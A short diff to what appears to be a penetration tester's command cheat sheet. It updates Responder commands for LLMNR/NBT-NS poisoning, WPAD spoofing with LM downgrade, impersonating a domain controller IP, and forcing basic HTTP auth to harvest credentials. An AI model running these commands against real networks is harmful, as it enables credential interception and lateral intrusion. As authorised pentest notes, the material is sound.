@@ -57,10 +57,14 @@ nmap -p 21 -sV -sC --script=ftp-syst -iL ftp-hosts.txt
 #########################################
 #LLMNR/NBT-trash enums, watch these in a seperate tab for low hanging fruit
 #basic inspection for noisy domains
-responder -A -i tap0/eth0/zt+/whatever
-#wpad (old af) and ntlm downgrade responder
-responder -i tap0 -wF -lm 
-
+responder -A -I tap0/eth0/zt+/whatever
+#wpad with ntlm
+responder -I tap0 --lm
+responder -I tap0 --lm -e SpoofedIpOfDC
+#server exec and html to target, can edit payload and page text easily 
+responder -I tap0 --lm -r On -w On
+#wpad (old af) and basic http auth after initial inspect for ground fruit
+responder -I tap0 -wFb 
 
 
 
